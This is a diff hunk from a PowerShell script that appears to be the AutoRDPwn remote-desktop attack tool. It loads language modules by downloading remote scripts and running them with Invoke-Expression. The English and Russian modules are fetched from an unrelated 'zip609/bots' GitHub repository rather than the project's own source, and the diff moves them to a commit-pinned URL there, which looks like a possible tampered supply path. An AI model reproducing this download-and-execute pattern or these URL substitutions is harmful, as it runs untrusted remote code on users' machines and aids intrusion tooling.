@@ -119,12 +119,12 @@ function Remove-Exclusions {
     else { Write-Host ; Write-Host "[!] Wrong option, please try again" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }} else { continue }}} until ($input -in '1','2','3','4','5','6','7','X')}
 
     if($lang -like '-lang') { $language=$args[3] }
-    if($language -in 'English') { if ($local){ Import-Module .\Resources\Languages\English.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/zip609/bots/main/English.ps1')}}
+    if($language -in 'English') { if ($local){ Import-Module .\Resources\Languages\English.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://github.com/zip609/bots/raw/7f4c1e657a88baa68c52572fda0495d6a5756252/English.ps1')}}
     if($language -in 'Spanish') { if ($local){ Import-Module .\Resources\Languages\Spanish.ps1 } else {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Languages/Spanish.ps1')}}
     if($language -in 'French') { if ($local){ Import-Module .\Resources\Languages\French.ps1 } else {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Languages/French.ps1')}}
     if($language -in 'German') { if ($local){ Import-Module .\Resources\Languages\German.ps1 } else {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Languages/German.ps1')}}
     if($language -in 'Italian') { if ($local){ Import-Module .\Resources\Languages\Italian.ps1 } else {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Languages/Italian.ps1')}}
-    if($language -in 'Russian') { if ($local){ Import-Module .\Resources\Languages\Russian.ps1 } else {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/zip609/bots/main/Russian.ps1')}}
+    if($language -in 'Russian') { if ($local){ Import-Module .\Resources\Languages\Russian.ps1 } else {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://github.com/zip609/bots/raw/7f4c1e657a88baa68c52572fda0495d6a5756252/Russian.ps1')}}
     if($language -in 'Portuguese') { if ($local){ Import-Module .\Resources\Languages\Portuguese.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Languages/Portuguese.ps1')}}
     
     $powershell = $host.version ; if($powershell.major -lt 4) { Write-Host ; Write-Host "[!] $txt3" -ForegroundColor 'Red' ; Write-Host
